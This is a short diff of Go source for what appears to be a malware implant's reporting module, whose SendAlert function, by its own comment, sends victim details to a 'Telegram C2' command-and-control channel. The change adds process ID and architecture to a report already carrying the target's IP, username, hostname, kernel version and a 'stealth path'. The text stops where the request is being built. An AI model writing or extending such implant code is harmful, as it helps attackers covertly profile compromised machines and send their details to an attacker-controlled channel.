@@ -36,6 +36,8 @@ type AlertData struct {
 	KernelVer     string
 	ActionDetails string
 	StealthPath   string
+	PID           int
+	Arch          string
 }
 
 // SendAlert sends a structured HTML report to the Telegram C2.
@@ -46,17 +48,23 @@ func SendAlert(event AlertData) error {
 		event.KernelVer = GetKernelVersion()
 	}
 
+	if event.Arch == "" {
+		event.Arch = runtime.GOARCH
+	}
+
 	payload := fmt.Sprintf(
-		"<b>SYSTEM ALERT: [%s]</b>\n"+
-			"<b>TARGET IP    :</b> <code>%s</code>\n"+
-			"<b>USER         :</b> <code>%s</code>\n"+
-			"<b>HOSTNAME     :</b> <code>%s</code>\n"+
-			"<b>KERNEL VER   :</b> <code>%s</code>\n"+
-			"<b>ACTION       :</b> %s\n"+
-			"<b>STEALTH PATH :</b> <code>%s</code>\n"+
+		"<b>SYSTEM ALERT: [%s]</b><br>"+
+			"<b>TARGET IP    :</b> <code>%s</code><br>"+
+			"<b>USER         :</b> <code>%s</code><br>"+
+			"<b>HOSTNAME     :</b> <code>%s</code><br>"+
+			"<b>KERNEL VER   :</b> <code>%s</code><br>"+
+			"<b>PID / ARCH   :</b> <code>%d / %s</code><br>"+
+			"<b>ACTION       :</b> %s<br>"+
+			"<b>STEALTH PATH :</b> <code>%s</code><br>"+
 			"<b>TIMESTAMP    :</b> %s",
 		event.Type, event.IP, event.User, event.Hostname, event.KernelVer,
-		event.ActionDetails, event.StealthPath, time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
+		event.PID, event.Arch, event.ActionDetails, event.StealthPath,
+		time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
 	)
 
 	vals := url.Values{}
